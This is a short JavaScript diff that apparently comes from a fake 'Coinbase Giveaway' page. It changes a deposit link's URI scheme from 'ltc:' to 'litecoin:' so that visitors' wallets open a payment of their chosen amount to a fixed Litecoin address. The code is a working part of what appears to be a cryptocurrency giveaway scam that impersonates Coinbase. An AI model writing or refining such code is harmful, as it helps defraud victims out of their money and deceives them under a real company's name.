@@ -197,7 +197,7 @@ function update_trans() {
         .parent()
         .attr(
           'href',
-          'ltc:ltc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694?amount=' +
+          'litecoin:ltc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694?amount=' +
             amount_entered +
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
